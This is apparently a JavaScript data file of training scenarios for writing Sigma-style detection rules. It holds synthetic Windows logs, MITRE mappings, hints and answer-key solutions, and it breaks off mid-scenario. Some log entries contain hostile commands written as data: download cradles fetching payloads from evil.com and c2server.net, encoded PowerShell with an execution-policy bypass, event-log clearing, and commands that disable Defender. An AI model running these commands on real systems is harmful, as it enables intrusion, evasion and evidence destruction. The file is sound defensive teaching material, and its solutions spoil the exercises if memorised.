/**
 * Level 2: Intermediate Scenarios (17 scenarios)
 * Focus: Multiple conditions, filtering false positives, parent-child relationships
 * Difficulty: 2-4 (Medium to Hard)
 */

export const LEVEL_2_SCENARIOS = [
  // Scenario 1: Office Spawning Shell
  {
    id: 'L2-001',
    title: 'Macro Madness',
    level: 2,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Execution',
      tacticId: 'TA0002',
      technique: 'T1204.002',
      techniqueName: 'User Execution: Malicious File',
      url: 'https://attack.mitre.org/techniques/T1204/002/'
    },
    realWorldReference: {
      incidents: ['Emotet', 'Dridex', 'TrickBot', 'Qakbot'],
      description: 'Malicious Office documents with macros spawn command shells. This is the most common initial access vector.',
      year: '2014-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L2-001</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL</span></p>
        </div>
        <p><strong>Intelligence:</strong> Malicious macro execution detected. Office applications are spawning command interpreters.</p>
        <p><strong>Objective:</strong> Detect when Office applications (Word, Excel, PowerPoint) spawn cmd.exe or powershell.exe.</p>
        <p><strong>Challenge:</strong> You need to check the <code>ParentImage</code> field for Office apps.</p>
      </div>
    `,
    logs: [
      {
        id: 20001,
        timestamp: 'Nov 15 09:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c dir',
        parentImage: 'C:\\Windows\\explorer.exe',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 20002,
        timestamp: 'Nov 15 09:05:00',
        host: 'WORKSTATION-05',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -ep bypass -e JABjAGwAaQBlAG4AdAA=',
        parentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 20003,
        timestamp: 'Nov 15 09:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -File C:\\Scripts\\report.ps1',
        parentImage: 'C:\\Windows\\System32\\svchost.exe',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 20004,
        timestamp: 'Nov 15 09:15:00',
        host: 'WORKSTATION-08',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c whoami && net user',
        parentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE',
        user: 'CORP\\target',
        malicious: true
      }
    ],
    hints: [
      { cost: 50, content: 'Check ParentImage for Office applications like WINWORD.EXE, EXCEL.EXE' },
      { cost: 100, content: 'Use ParentImage|endswith with a list of Office executables' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith:\\n      - \'cmd.exe\'\\n      - \'powershell.exe\'\\n    ParentImage|endswith:\\n      - \'WINWORD.EXE\'\\n      - \'EXCEL.EXE\'\\n      - \'POWERPNT.EXE\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [20002, 20004],
    starterCode: `# Detect Office applications spawning shells
# Check the parent process of cmd/powershell

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 2: PowerShell Download Cradle
  {
    id: 'L2-002',
    title: 'Download Cradle',
    level: 2,
    difficulty: 3,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Execution',
      tacticId: 'TA0002',
      technique: 'T1059.001',
      techniqueName: 'Command and Scripting Interpreter: PowerShell',
      url: 'https://attack.mitre.org/techniques/T1059/001/'
    },
    realWorldReference: {
      incidents: ['Cobalt Strike', 'Empire', 'Metasploit'],
      description: 'PowerShell download cradles use various methods (IEX, Invoke-Expression, WebClient) to download and execute payloads.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #L2-002</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> PowerShell download cradles detected. Attackers are using various methods to download and execute remote scripts.</p>
        <p><strong>Objective:</strong> Detect PowerShell commands using download methods like <code>DownloadString</code>, <code>Invoke-WebRequest</code>, or <code>IEX</code>.</p>
      </div>
    `,
    logs: [
      {
        id: 20201,
        timestamp: 'Nov 16 10:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-Process | Sort-Object CPU -Descending',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 20202,
        timestamp: 'Nov 16 10:05:00',
        host: 'WORKSTATION-10',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 20203,
        timestamp: 'Nov 16 10:10:00',
        host: 'UPDATE-SRV',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Invoke-WebRequest -Uri https://update.microsoft.com/check -OutFile C:\\temp\\update.log',
        user: 'CORP\\svc_update',
        malicious: false
      },
      {
        id: 20204,
        timestamp: 'Nov 16 10:15:00',
        host: 'WORKSTATION-12',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -c "IEX(IWR http://c2server.net/stager)"',
        user: 'CORP\\target',
        malicious: true
      }
    ],
    hints: [
      { cost: 50, content: 'Look for IEX, Invoke-Expression, DownloadString in the command' },
      { cost: 100, content: 'Combine PowerShell detection with download method keywords' },
      { cost: 200, content: 'detection:\\n  selection_ps:\\n    Image|endswith: \'powershell.exe\'\\n  selection_download:\\n    CommandLine|contains:\\n      - \'DownloadString\'\\n      - \'IEX\'\\n      - \'Invoke-Expression\'\\n  condition: selection_ps and selection_download', isSolution: true }
    ],
    expectedDetections: [20202, 20204],
    starterCode: `# Detect PowerShell download cradles

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 3: Browser Spawning Shell
  {
    id: 'L2-003',
    title: 'Drive-By Download',
    level: 2,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Initial Access',
      tacticId: 'TA0001',
      technique: 'T1189',
      techniqueName: 'Drive-by Compromise',
      url: 'https://attack.mitre.org/techniques/T1189/'
    },
    realWorldReference: {
      incidents: ['Magnitude EK', 'RIG EK', 'Fallout EK'],
      description: 'Exploit kits in browsers spawn shells. Browsers should never directly spawn cmd or PowerShell.',
      year: '2012-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-orange-500 pl-4">
          <h3 class="font-bold text-orange-400">Incident Report #L2-003</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Potential exploit kit activity. Browsers are spawning command interpreters.</p>
        <p><strong>Objective:</strong> Detect when browser processes (Chrome, Firefox, Edge, IE) spawn cmd.exe or powershell.exe.</p>
      </div>
    `,
    logs: [
      {
        id: 20301,
        timestamp: 'Nov 17 11:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        commandLine: 'chrome.exe --type=renderer',
        parentImage: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 20302,
        timestamp: 'Nov 17 11:05:00',
        host: 'WORKSTATION-07',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c powershell -ep bypass -e JABzAD0=',
        parentImage: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
        user: 'CORP\\victim',
        malicious: true
      },
      {
        id: 20303,
        timestamp: 'Nov 17 11:10:00',
        host: 'DEV-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c npm install',
        parentImage: 'C:\\Program Files\\nodejs\\node.exe',
        user: 'CORP\\developer',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Check ParentImage for browser executables: chrome, firefox, msedge, iexplore' },
      { cost: 100, content: 'Combine Image (cmd/powershell) with ParentImage (browsers)' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith:\\n      - \'cmd.exe\'\\n      - \'powershell.exe\'\\n    ParentImage|endswith:\\n      - \'chrome.exe\'\\n      - \'firefox.exe\'\\n      - \'msedge.exe\'\\n      - \'iexplore.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [20302],
    starterCode: `# Detect browser spawning command shells

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 4: UAC Bypass via fodhelper
  {
    id: 'L2-004',
    title: 'UAC Bypass',
    level: 2,
    difficulty: 3,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Privilege Escalation',
      tacticId: 'TA0004',
      technique: 'T1548.002',
      techniqueName: 'Abuse Elevation Control Mechanism: Bypass User Account Control',
      url: 'https://attack.mitre.org/techniques/T1548/002/'
    },
    realWorldReference: {
      incidents: ['Agent Tesla', 'Remcos RAT', 'Various malware'],
      description: 'Fodhelper.exe auto-elevates and attackers abuse it by modifying registry keys to execute elevated commands.',
      year: '2017-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-yellow-500 pl-4">
          <h3 class="font-bold text-yellow-400">Incident Report #L2-004</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> UAC bypass attempt detected using fodhelper.exe technique.</p>
        <p><strong>Objective:</strong> Detect suspicious child processes spawned by fodhelper.exe (it shouldn't spawn cmd/powershell).</p>
      </div>
    `,
    logs: [
      {
        id: 20401,
        timestamp: 'Nov 18 12:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\fodhelper.exe',
        commandLine: 'fodhelper.exe',
        parentImage: 'C:\\Windows\\explorer.exe',
        user: 'CORP\\user1',
        malicious: false
      },
      {
        id: 20402,
        timestamp: 'Nov 18 12:05:00',
        host: 'WORKSTATION-09',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c C:\\temp\\payload.exe',
        parentImage: 'C:\\Windows\\System32\\fodhelper.exe',
        user: 'CORP\\victim',
        integrityLevel: 'High',
        malicious: true
      },
      {
        id: 20403,
        timestamp: 'Nov 18 12:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\cmd.exe',
        commandLine: 'cmd.exe /c ipconfig /all',
        parentImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Fodhelper.exe should not spawn cmd or powershell' },
      { cost: 100, content: 'Filter on ParentImage containing fodhelper.exe' },
      { cost: 200, content: 'detection:\\n  selection:\\n    ParentImage|endswith: \'fodhelper.exe\'\\n    Image|endswith:\\n      - \'cmd.exe\'\\n      - \'powershell.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [20402],
    starterCode: `# Detect UAC bypass via fodhelper

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 5: Kerberoasting
  {
    id: 'L2-005',
    title: 'Kerberoasting Attack',
    level: 2,
    difficulty: 3,
    logSource: 'authentication',
    mitre: {
      tactic: 'Credential Access',
      tacticId: 'TA0006',
      technique: 'T1558.003',
      techniqueName: 'Steal or Forge Kerberos Tickets: Kerberoasting',
      url: 'https://attack.mitre.org/techniques/T1558/003/'
    },
    realWorldReference: {
      incidents: ['APT29', 'FIN6', 'Wizard Spider'],
      description: 'Kerberoasting requests service tickets for SPNs to crack offline. Detected by TGS requests for unusual services.',
      year: '2014-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #L2-005</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Potential Kerberoasting activity. Service ticket requests with RC4 encryption detected.</p>
        <p><strong>Objective:</strong> Detect TGS requests (EventID 4769) with RC4 encryption (0x17) to non-standard service accounts.</p>
      </div>
    `,
    logs: [
      {
        id: 20501,
        timestamp: 'Nov 19 13:00:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        eventId: '4769',
        targetUser: 'HTTP/webserver.corp.local',
        encryptionType: '0x12',
        sourceIP: '192.168.1.100',
        ticketOptions: '0x40810000',
        malicious: false
      },
      {
        id: 20502,
        timestamp: 'Nov 19 13:05:00',
        host: 'DC01',
        severity: 'WARN',
        logSource: 'authentication',
        eventId: '4769',
        targetUser: 'MSSQLSvc/sqlserver.corp.local:1433',
        encryptionType: '0x17',
        sourceIP: '192.168.1.55',
        ticketOptions: '0x40810000',
        malicious: true
      },
      {
        id: 20503,
        timestamp: 'Nov 19 13:10:00',
        host: 'DC01',
        severity: 'INFO',
        logSource: 'authentication',
        eventId: '4768',
        targetUser: 'admin',
        encryptionType: '0x12',
        sourceIP: '192.168.1.50',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Kerberoasting uses RC4 encryption (0x17) for service tickets' },
      { cost: 100, content: 'Filter on encryption type 0x17 in TGS requests' },
      { cost: 200, content: 'detection:\\n  selection:\\n    EncryptionType: \'0x17\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [20502],
    starterCode: `# Detect Kerberoasting activity

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 6: Event Log Clearing
  {
    id: 'L2-006',
    title: 'Evidence Destruction',
    level: 2,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1070.001',
      techniqueName: 'Indicator Removal: Clear Windows Event Logs',
      url: 'https://attack.mitre.org/techniques/T1070/001/'
    },
    realWorldReference: {
      incidents: ['APT28', 'APT29', 'Most ransomware'],
      description: 'Attackers clear event logs to remove evidence of their activities. This is a critical anti-forensics technique.',
      year: '2010-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L2-006</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL</span></p>
        </div>
        <p><strong>Intelligence:</strong> Event log clearing detected! Attackers are attempting to cover their tracks.</p>
        <p><strong>Objective:</strong> Detect wevtutil.exe or PowerShell being used to clear event logs.</p>
      </div>
    `,
    logs: [
      {
        id: 20601,
        timestamp: 'Nov 20 14:00:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\wevtutil.exe',
        commandLine: 'wevtutil qe Security /c:10 /f:text',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 20602,
        timestamp: 'Nov 20 14:05:00',
        host: 'WORKSTATION-15',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\wevtutil.exe',
        commandLine: 'wevtutil cl Security',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 20603,
        timestamp: 'Nov 20 14:10:00',
        host: 'SERVER-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\wevtutil.exe',
        commandLine: 'wevtutil el',
        user: 'CORP\\svc_monitor',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "cl" (clear) command in wevtutil' },
      { cost: 100, content: 'Filter on wevtutil.exe with CommandLine containing "cl"' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'wevtutil.exe\'\\n    CommandLine|contains: \' cl \'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [20602],
    starterCode: `# Detect event log clearing

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 7: Lateral Movement via PsExec
  {
    id: 'L2-007',
    title: 'PsExec Lateral Movement',
    level: 2,
    difficulty: 3,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Lateral Movement',
      tacticId: 'TA0008',
      technique: 'T1570',
      techniqueName: 'Lateral Tool Transfer',
      url: 'https://attack.mitre.org/techniques/T1570/'
    },
    realWorldReference: {
      incidents: ['NotPetya', 'Ryuk', 'Most APT groups'],
      description: 'PsExec from Sysinternals is commonly used for lateral movement. The service name PSEXESVC is a key indicator.',
      year: '2010-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-orange-500 pl-4">
          <h3 class="font-bold text-orange-400">Incident Report #L2-007</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> PsExec-style lateral movement detected. PSEXESVC service being installed on remote systems.</p>
        <p><strong>Objective:</strong> Detect PsExec execution patterns - both the client and service-side indicators.</p>
      </div>
    `,
    logs: [
      {
        id: 20701,
        timestamp: 'Nov 21 15:00:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Tools\\PsExec.exe',
        commandLine: 'PsExec.exe \\\\server01 -accepteula cmd /c hostname',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 20702,
        timestamp: 'Nov 21 15:05:00',
        host: 'SERVER-02',
        severity: 'CRIT',
        image: 'C:\\Windows\\PSEXESVC.exe',
        commandLine: 'C:\\Windows\\PSEXESVC.exe',
        parentImage: 'C:\\Windows\\System32\\services.exe',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 20703,
        timestamp: 'Nov 21 15:10:00',
        host: 'SERVER-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\svchost.exe',
        commandLine: 'svchost.exe -k netsvcs',
        parentImage: 'C:\\Windows\\System32\\services.exe',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for PSEXESVC.exe being executed' },
      { cost: 100, content: 'Filter on Image or ParentImage containing PSEXE' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|contains: \'PSEXE\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [20702],
    starterCode: `# Detect PsExec lateral movement

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 8: Windows Defender Tampering
  {
    id: 'L2-008',
    title: 'Defender Disabled',
    level: 2,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1562.001',
      techniqueName: 'Impair Defenses: Disable or Modify Tools',
      url: 'https://attack.mitre.org/techniques/T1562/001/'
    },
    realWorldReference: {
      incidents: ['Ryuk', 'Conti', 'Most modern ransomware'],
      description: 'Attackers disable Windows Defender before deploying payloads. This is a standard pre-encryption step.',
      year: '2018-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-red-500 pl-4">
          <h3 class="font-bold text-red-400">Incident Report #L2-008</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500 font-bold">CRITICAL</span></p>
        </div>
        <p><strong>Intelligence:</strong> Windows Defender is being disabled via PowerShell commands.</p>
        <p><strong>Objective:</strong> Detect PowerShell commands that disable Windows Defender protection.</p>
      </div>
    `,
    logs: [
      {
        id: 20801,
        timestamp: 'Nov 22 16:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Get-MpComputerStatus',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 20802,
        timestamp: 'Nov 22 16:05:00',
        host: 'WORKSTATION-20',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 20803,
        timestamp: 'Nov 22 16:10:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe Update-MpSignature',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for "DisableRealtimeMonitoring" or "Set-MpPreference" with disable flags' },
      { cost: 100, content: 'Filter on CommandLine containing both Set-MpPreference and Disable' },
      { cost: 200, content: 'detection:\\n  selection:\\n    Image|endswith: \'powershell.exe\'\\n    CommandLine|contains|all:\\n      - \'Set-MpPreference\'\\n      - \'Disable\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [20802],
    starterCode: `# Detect Windows Defender being disabled

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 9: DNS Beaconing Pattern
  {
    id: 'L2-009',
    title: 'C2 Beaconing',
    level: 2,
    difficulty: 4,
    logSource: 'dns',
    mitre: {
      tactic: 'Command and Control',
      tacticId: 'TA0011',
      technique: 'T1071.001',
      techniqueName: 'Application Layer Protocol: Web Protocols',
      url: 'https://attack.mitre.org/techniques/T1071/001/'
    },
    realWorldReference: {
      incidents: ['Cobalt Strike', 'APT29', 'Most C2 frameworks'],
      description: 'C2 beacons communicate at regular intervals. Detection focuses on suspicious domain patterns and query sources.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-purple-500 pl-4">
          <h3 class="font-bold text-purple-400">Incident Report #L2-009</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Suspicious DNS beaconing detected. Regular queries to unusual domains from non-browser processes.</p>
        <p><strong>Objective:</strong> Detect DNS queries from rundll32.exe or regsvr32.exe (these shouldn't make DNS queries normally).</p>
      </div>
    `,
    logs: [
      {
        id: 20901,
        timestamp: 'Nov 23 17:00:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        logSource: 'dns',
        processName: 'chrome.exe',
        queryName: 'www.microsoft.com',
        queryType: 'A',
        malicious: false
      },
      {
        id: 20902,
        timestamp: 'Nov 23 17:05:00',
        host: 'WORKSTATION-15',
        severity: 'WARN',
        logSource: 'dns',
        processName: 'rundll32.exe',
        queryName: 'update-check.malware-c2.com',
        queryType: 'A',
        malicious: true
      },
      {
        id: 20903,
        timestamp: 'Nov 23 17:10:00',
        host: 'DNS-SERVER',
        severity: 'INFO',
        logSource: 'dns',
        processName: 'dns.exe',
        queryName: 'corp.local',
        queryType: 'SOA',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'rundll32.exe and regsvr32.exe making DNS queries is suspicious' },
      { cost: 100, content: 'Filter on ProcessName containing these LOLBins' },
      { cost: 200, content: 'detection:\\n  selection:\\n    ProcessName|endswith:\\n      - \'rundll32.exe\'\\n      - \'regsvr32.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [20902],
    starterCode: `# Detect suspicious DNS queries from LOLBins

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 10: WMI Persistence
  {
    id: 'L2-010',
    title: 'WMI Event Subscription',
    level: 2,
    difficulty: 4,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Persistence',
      tacticId: 'TA0003',
      technique: 'T1546.003',
      techniqueName: 'Event Triggered Execution: Windows Management Instrumentation Event Subscription',
      url: 'https://attack.mitre.org/techniques/T1546/003/'
    },
    realWorldReference: {
      incidents: ['APT29', 'APT33', 'DarkHotel'],
      description: 'WMI event subscriptions provide fileless persistence. Attackers create consumers that trigger on events.',
      year: '2015-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-cyan-500 pl-4">
          <h3 class="font-bold text-cyan-400">Incident Report #L2-010</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> WMI persistence mechanism detected. Event subscriptions being created.</p>
        <p><strong>Objective:</strong> Detect WMI commands creating event consumers or subscriptions.</p>
      </div>
    `,
    logs: [
      {
        id: 21001,
        timestamp: 'Nov 24 09:00:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\wbem\\WMIC.exe',
        commandLine: 'wmic process list brief',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 21002,
        timestamp: 'Nov 24 09:05:00',
        host: 'WORKSTATION-18',
        severity: 'CRIT',
        image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        commandLine: 'powershell.exe -c "Set-WmiInstance -Class __EventFilter -Namespace root\\subscription"',
        user: 'NT AUTHORITY\\SYSTEM',
        malicious: true
      },
      {
        id: 21003,
        timestamp: 'Nov 24 09:10:00',
        host: 'MGMT-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\wbem\\WMIC.exe',
        commandLine: 'wmic qfe list',
        user: 'CORP\\admin',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'Look for __EventFilter, __EventConsumer, or root\\subscription in commands' },
      { cost: 100, content: 'Filter on CommandLine containing WMI persistence keywords' },
      { cost: 200, content: 'detection:\\n  selection:\\n    CommandLine|contains:\\n      - \'__EventFilter\'\\n      - \'__EventConsumer\'\\n      - \'root\\\\subscription\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [21002],
    starterCode: `# Detect WMI persistence

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 11: SMB Lateral Movement
  {
    id: 'L2-011',
    title: 'SMB Remote Execution',
    level: 2,
    difficulty: 3,
    logSource: 'network',
    mitre: {
      tactic: 'Lateral Movement',
      tacticId: 'TA0008',
      technique: 'T1021.002',
      techniqueName: 'Remote Services: SMB/Windows Admin Shares',
      url: 'https://attack.mitre.org/techniques/T1021/002/'
    },
    realWorldReference: {
      incidents: ['WannaCry', 'NotPetya', 'EternalBlue exploits'],
      description: 'SMB (port 445) is used for lateral movement via admin shares (C$, ADMIN$). Unusual SMB connections indicate compromise.',
      year: '2017-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-orange-500 pl-4">
          <h3 class="font-bold text-orange-400">Incident Report #L2-011</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-red-500">HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Suspicious SMB connections detected between workstations.</p>
        <p><strong>Objective:</strong> Detect SMB (port 445) connections from suspicious processes like cmd.exe or powershell.exe.</p>
      </div>
    `,
    logs: [
      {
        id: 21101,
        timestamp: 'Nov 25 10:00:00',
        host: 'FILE-SRV',
        severity: 'INFO',
        logSource: 'network',
        processName: 'System',
        direction: 'inbound',
        sourceIP: '192.168.1.100',
        destPort: '445',
        protocol: 'TCP',
        malicious: false
      },
      {
        id: 21102,
        timestamp: 'Nov 25 10:05:00',
        host: 'WORKSTATION-22',
        severity: 'WARN',
        logSource: 'network',
        processName: 'powershell.exe',
        direction: 'outbound',
        sourceIP: '192.168.1.55',
        destIP: '192.168.1.200',
        destPort: '445',
        protocol: 'TCP',
        malicious: true
      },
      {
        id: 21103,
        timestamp: 'Nov 25 10:10:00',
        host: 'WORKSTATION-01',
        severity: 'INFO',
        logSource: 'network',
        processName: 'explorer.exe',
        direction: 'outbound',
        destIP: '192.168.1.10',
        destPort: '445',
        protocol: 'TCP',
        malicious: false
      }
    ],
    hints: [
      { cost: 50, content: 'PowerShell or cmd connecting to port 445 is suspicious' },
      { cost: 100, content: 'Filter on DestPort 445 and ProcessName containing powershell or cmd' },
      { cost: 200, content: 'detection:\\n  selection:\\n    DestPort: \'445\'\\n    ProcessName|endswith:\\n      - \'powershell.exe\'\\n      - \'cmd.exe\'\\n  condition: selection', isSolution: true }
    ],
    expectedDetections: [21102],
    starterCode: `# Detect suspicious SMB lateral movement

detection:
  selection:
    # Add your detection logic here
  condition: selection`
  },

  // Scenario 12: Firewall Rule Manipulation
  {
    id: 'L2-012',
    title: 'Firewall Bypass',
    level: 2,
    difficulty: 2,
    logSource: 'process_creation',
    mitre: {
      tactic: 'Defense Evasion',
      tacticId: 'TA0005',
      technique: 'T1562.004',
      techniqueName: 'Impair Defenses: Disable or Modify System Firewall',
      url: 'https://attack.mitre.org/techniques/T1562/004/'
    },
    realWorldReference: {
      incidents: ['Most malware', 'RATs', 'Ransomware'],
      description: 'Attackers modify firewall rules to allow their traffic or disable the firewall entirely.',
      year: '2010-Present'
    },
    briefing: `
      <div class="space-y-4">
        <div class="border-l-4 border-yellow-500 pl-4">
          <h3 class="font-bold text-yellow-400">Incident Report #L2-012</h3>
          <p class="text-sm text-gray-400">Priority: <span class="text-orange-400">MEDIUM-HIGH</span></p>
        </div>
        <p><strong>Intelligence:</strong> Firewall rules are being modified to allow unauthorized traffic.</p>
        <p><strong>Objective:</strong> Detect netsh.exe being used to add firewall rules or disable the firewall.</p>
      </div>
    `,
    logs: [
      {
        id: 21201,
        timestamp: 'Nov 26 11:00:00',
        host: 'ADMIN-PC',
        severity: 'INFO',
        image: 'C:\\Windows\\System32\\netsh.exe',
        commandLine: 'netsh advfirewall show allprofiles',
        user: 'CORP\\admin',
        malicious: false
      },
      {
        id: 21202,
